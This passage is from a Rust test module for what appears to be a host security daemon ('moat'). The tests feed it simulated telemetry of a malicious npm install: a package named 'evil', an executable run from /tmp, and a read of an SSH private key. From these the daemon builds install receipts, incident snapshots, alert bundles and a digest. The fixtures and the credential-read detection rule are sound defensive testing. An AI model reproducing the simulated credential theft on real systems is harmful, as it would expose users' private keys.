        d.handle_line(&format!(
            r#"{{"process_exec":{{"process":{{"exec_id":"r-node","pid":41233,"uid":1000,"cwd":"/home/dan/proj","binary":"/usr/bin/node","arguments":"/home/dan/proj/node_modules/evil/setup.mjs","start_time":"{}","parent_exec_id":"r-npm2"}}}}}}"#,
            t0
        ));
        d.handle_line(&format!(
            r#"{{"process_exec":{{"process":{{"exec_id":"r-tmp","pid":41240,"uid":1000,"cwd":"/home/dan/proj","binary":"/tmp/.x9k","arguments":"","start_time":"{}","parent_exec_id":"r-node"}}}}}}"#,
            t0
        ));
        // A credential read inside the install, and a persistence write.
        d.handle_line(r#"{"process_kprobe":{"process":{"exec_id":"r-node","pid":41233,"uid":1000,"binary":"/usr/bin/node","cwd":"/home/dan/proj","parent_exec_id":"r-npm2"},"function_name":"security_file_permission","policy_name":"moat-cred-ssh-private-key-read","args":[{"file_arg":{"path":"/home/dan/.ssh/id_rsa_moat_fixture"}},{"int_arg":4}]},"time":"2026-09-03T16:21:07.000Z"}"#);

        assert_eq!(d.store.receipts().len(), 0, "nothing until the root exits");
        // The nested npm exiting is not the end of the install.
        d.handle_line(r#"{"process_exit":{"process":{"exec_id":"r-npm2","pid":41210,"binary":"/usr/bin/npm"},"status":0}}"#);
        assert_eq!(d.store.receipts().len(), 0, "only the outermost root closes it");

        d.handle_line(r#"{"process_exit":{"process":{"exec_id":"r-npm","pid":41201,"binary":"/usr/bin/npm","arguments":"install"},"status":0}}"#);
        let rs = d.store.receipts();
        assert_eq!(rs.len(), 1, "one install, one receipt");
        let r = &rs[0];
        assert_eq!(r.root_exe, "/usr/bin/npm");
        assert_eq!(r.root_args, "install");
        assert_eq!(r.cwd, "/home/dan/proj");
        assert_eq!(r.exit, 0);
        assert_eq!(r.postinstall_scripts, vec!["evil"], "the node_modules package");
        assert_eq!(r.credential_reads, vec!["/home/dan/.ssh/id_rsa_moat_fixture"]);
        assert_eq!(r.execs_from_tmp, 1);
        assert!(!r.id.is_empty());
        // A receipt is not an alert: it never reaches the badge.
        assert!(!d.store.load().iter().any(|a| a.rule.contains("receipt")));
        assert_eq!(d.receipt_list(10).len(), 1);
    }

    /// LEARNING §4: a high alert is snapshotted, a low one is not, and the
    /// snapshot reaches the record as an update line.
    #[test]
    fn a_high_alert_gets_an_incident_snapshot_and_a_low_one_does_not() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        replay(&mut d);

        let alerts = d.store.load();
        let base = d.incidents_dir();
        for a in &alerts {
            let want = crate::alert::severity_rank(&a.severity) >= 2 && !a.is_suppressed();
            assert_eq!(
                a.incident.is_some(),
                want,
                "{} ({}) incident: {:?}",
                a.rule,
                a.severity,
                a.incident
            );
            if let Some(inc) = &a.incident {
                assert_eq!(inc.dir, base.join(&a.id).display().to_string());
                assert!(base.join(&a.id).join("process.json").exists());
                assert!(base.join(&a.id).join("tree.txt").exists());
                assert!(base.join(&a.id).join("net.txt").exists());
                assert!(base.join(&a.id).join("meta.json").exists());
                assert!(inc.files.iter().any(|f| f.name == "process.json"));
                for f in &inc.files {
                    assert_eq!(f.sha256.len(), 64, "{} has no hash", f.name);
                }
                // tree.txt is the daemon's own view of the chain.
                let tree = std::fs::read_to_string(base.join(&a.id).join("tree.txt")).unwrap();
                assert!(tree.contains(&a.process.exe), "{}", tree);
            }
        }
        assert!(d.incidents_captured > 0);
        assert_eq!(
            crate::incident::count(&base) as u64,
            d.incidents_captured,
            "one directory per capture"
        );
        assert_eq!(d.status()["incidents"], d.incidents_captured);
    }

    /// The threshold is a config key, and `never` is a real off switch.
    #[test]
    fn the_snapshot_threshold_is_configurable() {
        for (min, want) in [("critical", true), ("never", false)] {
            let dir = tempfile::tempdir().unwrap();
            let (mut d, _) = dev_daemon(dir.path());
            d.cfg.incidents.snapshot_min_severity = min.into();
            replay(&mut d);
            let any = d.store.load().iter().any(|a| a.incident.is_some());
            assert_eq!(any, want, "min = {}", min);
            if min == "critical" {
                for a in d.store.load() {
                    if a.incident.is_some() {
                        assert_eq!(a.severity, "critical");
                    }
                }
            }
        }
    }

    /// LEARNING §2: the bundle, and the fact that the daemon writes it and
    /// nothing else.
    #[test]
    fn the_bundle_is_written_next_to_the_snapshot_and_fences_process_strings() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        replay(&mut d);
        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-cred-ssh-private-key-read")
            .unwrap();

        let path = d.write_bundle(&a.id).unwrap();
        assert_eq!(path, d.incidents_dir().join(&a.id).join("bundle.md"));
        let md = std::fs::read_to_string(&path).unwrap();
        assert!(md.contains(&format!("# Moat alert {}", a.id)));
        assert!(md.contains("```DATA"));
        assert!(md.contains("/home/dan/.ssh/id_ed25519"), "the alerted file is in the bundle");
        assert!(md.contains("## Incident snapshot"), "the snapshot is linked");
        assert!(md.contains("process.json"));
        // The ancestry gets args and cwd back from the live table.
        assert!(md.contains("args: /usr/lib/node_modules/npm/bin/npm-cli.js install") || md.contains("args: install"), "{}", md);
        // A second call is idempotent, and an unknown id is a clear error.
        assert_eq!(d.write_bundle(&a.id).unwrap(), path);
        assert!(d.write_bundle("01NOPE").unwrap_err().contains("no alert"));
    }

    /// LEARNING §5: the daemon computes the digest; it never sends it.
    #[test]
    fn the_digest_counts_the_week_and_persists_its_switch() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());
        replay(&mut d);

        let now = util::unix_secs();
        let g = d.digest(now);
        assert!(g.enabled, "on by default");
        assert!(g.due > now);
        let high = d
            .store
            .load()
            .iter()
            .filter(|a| !a.is_suppressed() && a.severity_rank() >= 2)
            .count() as u64;
        assert_eq!(g.summary.incidents, high);
        assert_eq!(g.summary.installs, d.store.receipts().len() as u64);
        assert!(g.summary.text().starts_with("moat: "));
        assert_eq!(d.status()["digest"], true);

        // The off switch lives in state.json, so it survives a restart.
        d.set_digest(false);
        assert_eq!(d.status()["digest"], false);
        assert_eq!(d.status()["digest_enabled"], false);
        let d2 = Daemon::new(cfg.clone(), &dir.path().join("moat.toml")).unwrap();
        assert!(!d2.digest_enabled, "state.json remembers the switch");

        // And a delivery is recorded so a catch-up run does not send twice.
        d.digest_sent(now);
        assert_eq!(d.digest(now).last_sent, now);
        let d3 = Daemon::new(cfg, &dir.path().join("moat.toml")).unwrap();
        assert_eq!(d3.digest_last_sent, now);
    }

    #[test]
    fn access_words() {
        assert_eq!(access_word(Some(4)).unwrap(), "read");
        assert_eq!(access_word(Some(2)).unwrap(), "write");
        assert_eq!(access_word(Some(6)).unwrap(), "read+write");
        assert_eq!(access_word(Some(0)).unwrap(), "mask 0");
        assert!(access_word(None).is_none());
    }
}
